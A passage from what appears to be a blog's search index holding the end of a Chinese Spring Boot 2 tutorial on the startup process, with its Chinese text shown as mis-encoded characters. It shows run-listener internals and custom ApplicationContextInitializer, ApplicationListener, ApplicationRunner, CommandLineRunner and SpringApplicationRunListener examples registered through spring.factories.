class="hljs-params">(ApplicationStartup var1)</span>;<br><br>    ApplicationStartup <span class="hljs-title function_">getApplicationStartup</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addBeanFactoryPostProcessor</span><span class="hljs-params">(BeanFactoryPostProcessor var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationListener</span><span class="hljs-params">(ApplicationListener&lt;?&gt; var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setClassLoader</span><span class="hljs-params">(ClassLoader var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProtocolResolver</span><span class="hljs-params">(ProtocolResolver var1)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> BeansException, IllegalStateException;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerShutdownHook</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isActive</span><span class="hljs-params">()</span>;<br><br>    ConfigurableListableBeanFactory <span class="hljs-title function_">getBeanFactory</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalStateException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#4.</span><br><span class="hljs-comment">#spring.factories</span><br><span class="hljs-comment"># Run Listeners</span><br><span class="hljs-attr">org.springframework.boot.SpringApplicationRunListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.context.event.EventPublishingRunListener</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringApplicationRunListeners</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Log log;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;SpringApplicationRunListener&gt; listeners;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ApplicationStartup applicationStartup;<br><br>SpringApplicationRunListeners(Log log, Collection&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SpringApplicationRunListener</span>&gt; listeners,<br>ApplicationStartup applicationStartup) &#123;<br><span class="hljs-built_in">this</span>.log = log;<br><span class="hljs-built_in">this</span>.listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(listeners);<br><span class="hljs-built_in">this</span>.applicationStartup = applicationStartup;<br>&#125;<br><br>    <span class="hljs-comment">//5.éå† SpringApplicationRunListener è°ƒç”¨ starting æ–¹æ³•ï¼›</span><br><span class="hljs-comment">//ç›¸å½“äºé€šçŸ¥æ‰€æœ‰æ„Ÿå…´è¶£ç³»ç»Ÿæ­£åœ¨å¯åŠ¨è¿‡ç¨‹çš„äººï¼Œé¡¹ç›®æ­£åœ¨ startingã€‚</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">starting</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext, Class&lt;?&gt; mainApplicationClass)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.starting&quot;</span>, (listener) -&gt; listener.starting(bootstrapContext),<br>(step) -&gt; &#123;<br><span class="hljs-keyword">if</span> (mainApplicationClass != <span class="hljs-literal">null</span>) &#123;<br>step.tag(<span class="hljs-string">&quot;mainApplicationClass&quot;</span>, mainApplicationClass.getName());<br>&#125;<br>&#125;);<br>&#125;<br>    <br>    <span class="hljs-comment">//7.1</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">environmentPrepared</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext, ConfigurableEnvironment environment)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.environment-prepared&quot;</span>,<br>(listener) -&gt; listener.environmentPrepared(bootstrapContext, environment));<br>&#125;<br>    <br>    <span class="hljs-comment">//8.1</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextPrepared</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.context-prepared&quot;</span>, (listener) -&gt; listener.contextPrepared(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//8.2</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoaded</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.context-loaded&quot;</span>, (listener) -&gt; listener.contextLoaded(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//10.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">started</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.started&quot;</span>, (listener) -&gt; listener.started(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//12.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">running</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.running&quot;</span>, (listener) -&gt; listener.running(context));<br>&#125;<br>    <br>    <span class="hljs-comment">//14.</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">failed</span><span class="hljs-params">(ConfigurableApplicationContext context, Throwable exception)</span> &#123;<br>doWithListeners(<span class="hljs-string">&quot;spring.boot.application.failed&quot;</span>,<br>(listener) -&gt; callFailedListener(listener, context, exception), (step) -&gt; &#123;<br>step.tag(<span class="hljs-string">&quot;exception&quot;</span>, exception.getClass().toString());<br>step.tag(<span class="hljs-string">&quot;message&quot;</span>, exception.getMessage());<br>&#125;);<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWithListeners</span><span class="hljs-params">(String stepName, Consumer&lt;SpringApplicationRunListener&gt; listenerAction,</span><br><span class="hljs-params">Consumer&lt;StartupStep&gt; stepAction)</span> &#123;<br><span class="hljs-type">StartupStep</span> <span class="hljs-variable">step</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.applicationStartup.start(stepName);<br><span class="hljs-built_in">this</span>.listeners.forEach(listenerAction);<br><span class="hljs-keyword">if</span> (stepAction != <span class="hljs-literal">null</span>) &#123;<br>stepAction.accept(step);<br>&#125;<br>step.end();<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="86ã€åŸç†è§£æ-è‡ªå®šä¹‰äº‹ä»¶ç›‘å¬ç»„ä»¶"><a href="#86ã€åŸç†è§£æ-è‡ªå®šä¹‰äº‹ä»¶ç›‘å¬ç»„ä»¶" class="headerlink" title="86ã€åŸç†è§£æ-è‡ªå®šä¹‰äº‹ä»¶ç›‘å¬ç»„ä»¶"></a>86ã€åŸç†è§£æ-è‡ªå®šä¹‰äº‹ä»¶ç›‘å¬ç»„ä»¶</h2><p><code>MyApplicationContextInitializer.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContextInitializer;<br><span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationContextInitializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationContextInitializer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initialize</span><span class="hljs-params">(ConfigurableApplicationContext applicationContext)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyApplicationContextInitializer ....initialize.... &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MyApplicationListener.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationEvent;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApplicationEvent</span><span class="hljs-params">(ApplicationEvent event)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyApplicationListener.....onApplicationEvent...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MyApplicationRunner.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.ApplicationArguments;<br><span class="hljs-keyword">import</span> org.springframework.boot.ApplicationRunner;<br><span class="hljs-keyword">import</span> org.springframework.core.annotation.Order;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><br><span class="hljs-meta">@Order(1)</span><br><span class="hljs-meta">@Component</span><span class="hljs-comment">//æ”¾å…¥å®¹å™¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplicationRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationRunner</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(ApplicationArguments args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyApplicationRunner...run...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MyCommandLineRunner.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.CommandLineRunner;<br><span class="hljs-keyword">import</span> org.springframework.core.annotation.Order;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åº”ç”¨å¯åŠ¨åšä¸€ä¸ªä¸€æ¬¡æ€§äº‹æƒ…</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Order(2)</span><br><span class="hljs-meta">@Component</span><span class="hljs-comment">//æ”¾å…¥å®¹å™¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCommandLineRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CommandLineRunner</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;MyCommandLineRunner....run....&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>MySpringApplicationRunListener.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.ConfigurableBootstrapContext;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplicationRunListener;<br><span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.core.env.ConfigurableEnvironment;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpringApplicationRunListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SpringApplicationRunListener</span> &#123;<br><br>    <span class="hljs-keyword">private</span> SpringApplication application;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MySpringApplicationRunListener</span><span class="hljs-params">(SpringApplication application, String[] args)</span>&#123;<br>        <span class="hljs-built_in">this</span>.application = application;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">starting</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....starting....&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">environmentPrepared</span><span class="hljs-params">(ConfigurableBootstrapContext bootstrapContext, ConfigurableEnvironment environment)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....environmentPrepared....&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextPrepared</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....contextPrepared....&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoaded</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....contextLoaded....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">started</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....started....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">running</span><span class="hljs-params">(ConfigurableApplicationContext context)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....running....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">failed</span><span class="hljs-params">(ConfigurableApplicationContext context, Throwable exception)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySpringApplicationRunListener....failed....&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨å†Œ<code>MyApplicationContextInitializer</code>ï¼Œ<code>MyApplicationListener</code>ï¼Œ<code>MySpringApplicationRunListener</code>:</p><p><code>resources / META-INF / spring.factories</code>:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">org.springframework.context.ApplicationContextInitializer</span>=<span class="hljs-string">\</span><br><span class="hljs-string">  com.lun.boot.listener.MyApplicationContextInitializer</span><br><br><span class="hljs-attr">org.springframework.context.ApplicationListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">  com.lun.boot.listener.MyApplicationListener</span><br><br><span class="hljs-attr">org.springframework.boot.SpringApplicationRunListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">  com.lun.boot.listener.MySpringApplicationRunListener</span><br></code></pre></td></tr></table></figure><h2 id="87ã€åä¼šæœ‰æœŸ"><a href="#87ã€åä¼šæœ‰æœŸ" class="headerlink" title="87ã€åä¼šæœ‰æœŸ"></a>87ã€åä¼šæœ‰æœŸ</h2><blockquote><p>è·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ã€‚</p></blockquote><blockquote><p>çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚</p></blockquote><ul><li><p>Spring Boot 2 åœºæ™¯æ•´åˆç¯‡</p><ul><li>è™šæ‹ŸåŒ–æŠ€æœ¯</li><li>å®‰å…¨æ§åˆ¶</li><li>ç¼“å­˜æŠ€æœ¯</li><li>æ¶ˆæ¯ä¸­é—´ä»¶</li><li>å¯¹è±¡å­˜å‚¨</li><li>å®šæ—¶è°ƒåº¦</li><li>å¼‚æ­¥ä»»åŠ¡</li><li>åˆ†å¸ƒå¼ç³»ç»Ÿ</li></ul></li><li><p>Spring Boot 2 å“åº”å¼ç¼–ç¨‹</p><ul><li>å“åº”å¼ç¼–ç¨‹åŸºç¡€</li><li>Webfluxå¼€å‘Webåº”ç”¨</li><li>å“åº”å¼è®¿é—®æŒä¹…åŒ–å±‚</li><li>å“åº”å¼å®‰å…¨å¼€å‘</li><li>å“åº”å¼åŸç†</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringBoot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
